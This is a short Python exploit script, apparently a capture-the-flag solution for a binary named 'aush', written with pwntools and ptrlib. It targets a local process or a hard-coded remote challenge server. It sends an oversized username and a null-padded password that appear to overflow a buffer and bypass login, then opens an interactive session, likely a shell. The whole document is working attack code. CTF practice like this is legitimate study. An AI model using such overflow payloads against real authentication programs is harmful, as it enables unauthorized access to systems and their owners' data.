#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./aush")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.170.146.252", 31592)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b""
    payload += b"A" * 0x1FF
    io.sendlineafter(b"Username: ", payload)

    payload = b""
    payload += b"A" * (0x1FF - 167)
    payload = payload.ljust(0x1FF, b"\0")
    io.sendlineafter(b"Password: ", payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
